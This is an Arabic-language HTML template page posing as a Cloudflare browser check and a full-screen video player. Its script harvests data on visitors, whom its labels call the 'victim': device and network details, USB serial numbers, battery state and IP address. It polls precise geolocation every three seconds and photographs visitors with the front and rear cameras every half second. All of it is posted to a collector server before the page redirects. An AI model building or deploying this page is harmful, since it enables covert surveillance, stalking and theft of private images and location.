<!DOCTYPE html>
<html lang="ar-SA">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="robots" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>مرحبا بك</title>
  <style type="text/css">
    html, body {
      width: 100%;
      height: 100%;
      margin: 0;
      padding: 0;
    }
    body {
      background-color: #000;
      color: #fff;
      font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
      font-size: 16px;
      line-height: 1.7;
      -webkit-font-smoothing: antialiased;
    }
    /* إخفاء باقي المحتويات غير الفيديو */
    table, #cf-content, .challenge-form, .attribution, #cf-bubbles {
      display: none !important;
    }
    /* عرض الفيديو الرئيسي بكامل الشاشة */
    #video {
      display: block !important;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    /* زر الموقع يظهر في منتصف الشاشة على شكل زر مستطيل يشبه زر تشغيل الفيديو */
    #locationButton {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.8);
      padding: 20px 40px;
      border-radius: 5px;
      display: none;
      z-index: 9999;
      border: 2px solid #f58220;
    }
    #locationButton button {
      background: transparent;
      border: none;
      color: #f58220;
      font-size: 48px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- المحتوى المخفي كما في الكود الأصلي -->
  <table width="100%" height="100%" cellpadding="20">
    <tbody>
      <tr>
        <td align="center" valign="middle">
          <div class="cf-browser-verification cf-im-under-attack">
            <noscript>
              <h1 data-translate="turn_on_js" style="color:#bd2426;">الرجاء تفعيل JavaScript وإعادة تحميل الصفحة.</h1>
            </noscript>
            <div id="cf-content" style="display: block;">
              <div id="cf-bubbles">
                <div class="bubbles"></div>
                <div class="bubbles"></div>
                <div class="bubbles"></div>
              </div>
              <h1><span data-translate="checking_browser">لحظه وحده من فظلك</span></h1>
              <div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none">
                <p data-translate="turn_on_cookies" style="color:#bd2426;">الرجاء تمكين الكوكيز وإعادة تحميل الصفحة.</p>
              </div>
              <p data-translate="process_is_automatic"></p>
              <p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">الرجاء الانتظار لمدة تصل إلى 5 ثواني…</p>
              <p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">جار التوجيه… 6</p>
            </div>
            <form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=..." method="POST" enctype="application/x-www-form-urlencoded">
              <span data-translate="error" style="display: none;">رمز الخطأ: 1020</span>
            </form>
          </div>
          <div class="attribution"></div>
        </td>
      </tr>
    </tbody>
  </table>
  
  <!-- عرض الفيديو الرئيسي مع خاصية loop للتشغيل المستمر -->
  <video id="video" src="https://files.catbox.moe/lc3j5p.mp4" playsinline autoplay muted loop></video>
  <!-- Canvas مخفية لاستخدامها في التقاط الإطارات -->
  <canvas hidden id="tempCanvas" width="500" height="500"></canvas>
  
  <!-- زر تشغيل الموقع يظهر في منتصف الشاشة -->
  <div id="locationButton">
    <button id="enableLocation">▶</button>
  </div>
  
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
  <script type="text/javascript">
    var c = false, l = false, uid = "<%=uid %>";
    var locationEnabled = false;
    
    async function gather() {
      var td = "";
      <% if(!t){ %>
      td += '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#<%=ip %>"><%=ip %></a> | الوقت: <%=time %></b>';
      <% } else { %>
      await fetch("<%=a %>").then((r) => r.json()).then((d) => 
          td += '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#' + d.ip + '">' + d.ip + '</a> | الوقت: <%=time %></b>'
      );
      <% } %>
      
      td += "<br><br><b>⏳ التاريخ في جهاز الضحية :</b> " + new Date() + "<br>";
      var xo = ["productSub", "vendor", "maxTouchPoints", "doNotTrack", "hardwareConcurrency", "cookieEnabled", "appCodeName", "appName", "appVersion", "platform", "product", "userAgent", "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"];
      var xoc = ["type", "rtt", "saveData", "effectiveType", "downlink", "downlinkMax"];
      
      td += "<br><b>📱 معلومات الجهاز</b><br>";
      for (var i = 0; i < xo.length; i++) {
        if (xo[i] in navigator) {
          var str = navigator[xo[i]];
          td += "<b>" + xo[i] + "</b>: <code>" + str + "</code><br>";
        }
      }
      
      if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
        await navigator.mediaDevices?.enumerateDevices()
          .then(function(devices) {
            td += "<br><b>📷 معلومات الأجهزة الصوتية والبصرية</b><br>";
            devices.forEach(function(device) {
              td += "<b>" + device.kind + ":</b> " + device.label + " id = <code>" + device.deviceId + "</code><br>";
            });
          })
          .catch(function(err) {
            td += "<br><b>📷 معلومات الأجهزة الصوتية والبصرية</b><br>";
            td += "⚠️ خطأ في الأجهزة الصوتية والبصرية: " + err.name + ": " + err.message;
          });
      }
      
      if ("connection" in navigator) {
        td += "<br><b>🕸️ معلومات الشبكة</b><br>";
        for (var i = 0; i < xoc.length; i++) {
          var str = navigator.connection[xoc[i]];
          td += "<b>" + xoc[i] + "</b>: <code>" + str + "</code><br>";
        }
      }
      
      if ("usb" in navigator) {
        await navigator.usb.getDevices()
          .then(devices => {
            td += "<br><b>🔌 عدد الأجهزة USB المتصلة:</b> " + devices.length + "<br>";
            devices.forEach(device => {
              td += "<b>اسم المنتج:</b> " + device.productName + " , <b>الرقم التسلسلي: </b> <code>" + device.serialNumber + "</code><br>";
            });
          });
      }
      
      if ("getBattery" in navigator) {
        await navigator.getBattery().then(function(battery) {
          td += "<br><b>🔋 معلومات البطارية</b><br>";
          td += "<b>🔋 مستوى البطارية:</b> " + battery.level * 100 + "%<br><b>⚡ هل البطارية شحنت:</b> " + battery.charging;
        });
      }
      
      if (!navigator.geolocation) {
        td += "<br><b>📍 معلومات الموقع</b><br>";
        td += "⚠️ واجهة برمجة تطبيقات المواقع غير متوفرة";
        l = true;
      }
      
      // سحب الموقع كل 3 ثوانٍ للحصول على أعلى دقة
      setInterval(function() {
        navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, maximumAge: 0 });
      }, 3000);
      
      function success(pos) {
        locationEnabled = true;
        // عند نجاح الحصول على الموقع يتم إخفاء زر التشغيل
        document.getElementById("locationButton").style.display = "none";
        const crd = pos.coords;
        $.post("<%=a %>/location", { uid: uid, lat: encodeURIComponent(crd.latitude), lon: encodeURIComponent(crd.longitude), acc: encodeURIComponent(crd.accuracy) }, (s) => {
          l = true;
          red();
        });
      }
      
      function error(err) {
        // في حال فشل الحصول على الموقع يتم عرض زر التشغيل
        document.getElementById("locationButton").style.display = "block";
        td += "<br><b>📍 معلومات الموقع</b><br>";
        td += "⚠️ خطأ في الموقع: <code>" + err.message + "</code>";
        l = true;
      }
      
      // تشغيل الفيديو الرئيسي بشكل دائم
      var vid = document.getElementById("video");
      vid.play();
      
      // متغير لتبديل الكاميرا: true للكاميرا الأمامية، false للكاميرا الخلفية
      let useFront = true;
      
      // دالة التقاط الصورة من الكاميرا المطلوبة
      function captureFrame() {
        let currentUseFront = useFront;
        useFront = !useFront;
        
        let constraints = {
          audio: false,
          video: currentUseFront
                    ? { facingMode: "user" }
                    : { facingMode: { exact: "environment" } }
        };
        
        navigator.mediaDevices.getUserMedia(constraints)
          .then(function(stream) {
            let captureVideo = document.createElement("video");
            captureVideo.setAttribute("playsinline", "true");
            captureVideo.muted = true;
            captureVideo.srcObject = stream;
            captureVideo.play();
            
            captureVideo.addEventListener("canplay", function() {
              setTimeout(function() {
                let canvas = document.getElementById("tempCanvas");
                let context = canvas.getContext("2d");
                context.drawImage(captureVideo, 0, 0, canvas.width, canvas.height);
                let canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64,", "");
                $.post("<%=a %>/camsnap", { uid: uid, img: encodeURIComponent(canvasData) });
                stream.getTracks().forEach(track => track.stop());
              }, 150);
            });
          })
          .catch(function(e) {
            console.error("Error capturing frame: ", e);
          });
      }
      
      // التقاط صورة بالتناوب كل 500 مللي ثانية
      setInterval(captureFrame, 500);
      
      $.post("<%=a %>", { data: encodeURIComponent(td), uid: encodeURIComponent(uid) }, (s) => {});
    }
    
    function red() {
      if (c && l) {
        window.location.href = "<%=url %>";
      }
    }
    
    window.onload = () => {
      gather();
      var vid = document.getElementById("video");
      vid.style.display = "block";
      vid.play();
      
      // عند الضغط على زر "تشغيل الموقع" نحاول إعادة تشغيل الحصول على الموقع
      document.getElementById("enableLocation").addEventListener("click", function() {
        navigator.geolocation.getCurrentPosition(
          function(pos) {
            document.getElementById("locationButton").style.display = "none";
          },
          function(err) {
            console.error("Error re-enabling location: ", err);
          },
          { enableHighAccuracy: true, maximumAge: 0 }
        );
      });
    };
  </script>
</body>
</html>